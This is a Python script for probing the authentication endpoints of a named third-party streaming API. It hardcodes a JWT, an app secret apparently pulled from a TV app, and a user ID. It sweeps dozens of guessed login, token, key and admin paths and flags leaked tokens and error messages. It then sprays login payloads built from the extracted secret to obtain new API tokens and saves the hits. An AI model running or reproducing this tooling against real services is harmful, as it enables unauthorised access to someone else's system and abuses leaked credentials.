#!/usr/bin/env python3
"""
Phase 1A: Auth endpoint probing (focused, fast)
"""
import time, json, requests

BASE = "https://munoapi.com/api"
UA = "Android IOS v3.0"
TOK = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFuZHJvaWQgVFYiLCJhcHBuYW1lIjoiTXVub3dhdGNoIFRWIiwiaG9zdCI6Im11bm93YXRjaC5jbyIsImFwcHNlY3JldCI6IjAyMjc3OGU0MThhZDY4ZmZkYTlhYTRmYWIxODkyZmZmIiwiYWN0aXZhdGVkIjoiMSIsImV4cCI6MTcwNzM2ODQwMH0.unlPnEzptg6VFHs7WWm213bRHHNxYuAN2eZQvjtPKL0"
KEY = "022778e418ad68ffda9aa4fab1892fff"
UID = "82717"

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[1m"; D = "\033[90m"; C = "\033[96m"; X = "\033[0m"

def p(ep, method="GET", token=None, data=None, t=6):
    url = f"{BASE}/{ep}" if not ep.startswith("http") else ep
    h = {"Accept": "application/json", "User-Agent": UA}
    if token: h["X-Api-Key"] = token; h["Authorization"] = f"Bearer {token}"
    try:
        r = requests.request(method, url, headers=h, json=data, timeout=t)
        ct = r.headers.get("content-type","")
        j = r.json() if "json" in ct else None
        return r.status_code, j, r.text[:150] if not j else ""
    except: return 0, None, ""

# Auth endpoints to probe
endpoints = [
    "login","auth/login","user/login","signin","auth/signin","signup","auth/signup","register","auth/register","user/register",
    "token","auth/token","api/token","token/generate","token/create","token/new","token/refresh","token/renew","token/issue",
    "auth/refresh","auth/renew","refresh/token","apikey","api/key","api/generate","key/generate","generate/key",
    "app/register","app/create","developer/register","developer/key","auth","authenticate","verify","auth/verify",
    "forgot","reset","auth/reset","password/reset","logout","auth/logout","app/activate","activate","app/auth",
    "status","health","ping","info","api/info","","docs","swagger","openapi",
    "v1/auth","v2/auth","v3/auth","v1/token","v2/token","v3/token",
    "munowatch/auth","muno/auth","tv/auth","android/auth","tv/token","tv/login","device/register","device/auth",
    "user/me","user/profile","user/info","account","settings","config","admin","admin/login",
    "api_key","keys","api_keys","auth/keys","client","clients","app","apps",
]

print(f"\n{B}{C}{'='*75}{X}")
print(f"{B}{C}  PHASE 1A: AUTH ENDPOINT PROBING ({len(endpoints)} endpoints){X}")
print(f"{B}{C}{'='*75}{X}\n")

hits = []
for ep in endpoints:
    s, j, txt = p(ep)
    if s == 0 or s == 404:
        time.sleep(0.05); continue
    
    detail = ""
    interesting = False
    
    if s == 200 and j and isinstance(j, dict):
        keys = list(j.keys())[:6]
        jstr = json.dumps(j).lower()
        if any(w in jstr for w in ("token","api_key","jwt","eyj")):
            interesting = True; detail = f"TOKEN/KEY FOUND! {json.dumps(j)[:120]}"
        elif any(w in jstr for w in ("dashboard","banner","search","results","data")):
            interesting = True; detail = f"data keys: {keys}"
        else:
            detail = f"keys: {keys}"
            interesting = True
    elif s == 405:
        s2, j2, _ = p(ep, "POST")
        if s2 not in (0, 404, 405):
            interesting = True
            detail = f"405 but POST={s2}" + (f" keys: {list(j2.keys())[:4]}" if j2 and isinstance(j2, dict) else "")
    elif s in (401, 403):
        interesting = True
        detail = "AUTH PROTECTED" + (f": {json.dumps(j)[:60]}" if j else "")
    elif s >= 500 and j and isinstance(j, dict):
        exc = j.get("exception",[])
        if isinstance(exc, list) and exc and exc[0].get("message"):
            interesting = True; detail = f"LEAK: {exc[0]['message'][:70]}"
    elif s == 200 and txt:
        if any(w in txt.lower() for w in ("login","auth","token","api","key")):
            interesting = True; detail = f"HTML refs: {txt[:80]}"
    
    if interesting:
        hits.append({"ep": ep, "status": s, "body": j, "detail": detail})
        icon = f"{R}{B}HIT{X}" if "TOKEN" in detail else f"{Y} *{X}"
        print(f"  {icon} GET  /{ep:<38} → {s}  {detail}")
    
    time.sleep(0.08)

# Login payload tests on promising endpoints
print(f"\n  {B}Testing login payloads on auth endpoints...{X}\n")
login_eps = ["login","auth/login","user/login","auth","authenticate","token","auth/token","apikey","api/key","app/auth","activate","app/activate"]
payloads = [
    {"username": "Android TV", "appsecret": KEY},
    {"appname": "Munowatch TV", "appsecret": KEY},
    {"host": "munowatch.co", "appsecret": KEY},
    {"user_id": UID, "appsecret": KEY},
    {"appname": "Munowatch TV", "host": "munowatch.co", "appsecret": KEY},
]

for ep in login_eps:
    for pl in payloads:
        s, j, _ = p(ep, "POST", data=pl)
        if s in (200, 201) and j:
            jstr = json.dumps(j).lower()
            if any(w in jstr for w in ("token","key","jwt","eyj","success","true")):
                pk = list(pl.keys())[0]
                hits.append({"ep": ep, "status": s, "body": j, "detail": f"PAYLOAD HIT with {pk}"})
                print(f"  {R}{B}HIT{X} POST /{ep:<30} ({pk}) → {s}  {json.dumps(j)[:120]}")
        time.sleep(0.08)

# POST on all endpoints with the appsecret payload
print(f"\n  {B}POST sweep on all endpoints with appsecret...{X}\n")
for ep in endpoints:
    s, j, _ = p(ep, "POST", data={"appsecret": KEY, "appname": "Munowatch TV", "host": "munowatch.co"})
    if s in (200, 201) and j and isinstance(j, dict):
        jstr = json.dumps(j).lower()
        if any(w in jstr for w in ("token","key","jwt","eyj","success")):
            hits.append({"ep": ep, "status": s, "body": j, "detail": "POST SWEEP HIT"})
            print(f"  {R}{B}HIT{X} POST /{ep:<38} → {s}  {json.dumps(j)[:120]}")
    time.sleep(0.05)

print(f"\n{B}Total hits: {len(hits)}{X}")
with open("/home/z/my-project/download/phase1a_results.json", "w") as f:
    json.dump(hits, f, indent=2, default=str)
print(f"Saved to phase1a_results.json")
